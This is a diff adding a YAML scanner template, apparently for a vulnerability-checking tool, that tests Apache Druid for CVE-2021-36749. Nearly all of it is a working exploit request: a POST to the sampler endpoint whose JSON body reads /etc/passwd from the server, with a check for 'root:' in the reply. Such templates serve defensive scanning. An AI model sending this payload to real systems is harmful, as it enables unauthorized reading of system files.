@@ -1,0 +1,14 @@
+name: Apache-Druid-cve-2021-36749
+description: "读取etc/passwd"
+matchCount: 1
+rules:
+  - method: POST
+    path: "/druid/indexer/v1/sampler"
+    body: >
+      {"type": "index","spec": {"ioConfig": {"type": "index","inputSource": {"type": "local","baseDir": "/etc/","filter": "passwd"},"inputFormat": {"type": "json","keepNullColumns": true}},"dataSchema": {"dataSource": "sample","timestampSpec": {"column": "timestamp","format": "iso","missingValue": "1970"},"dimensionsSpec": {}}},"type": "index","tuningConfig": {"type": "index"}}
+    headers:
+      Content-Type: application/json
+    expression:
+      status: 200
+      body_any:
+        - "root:"
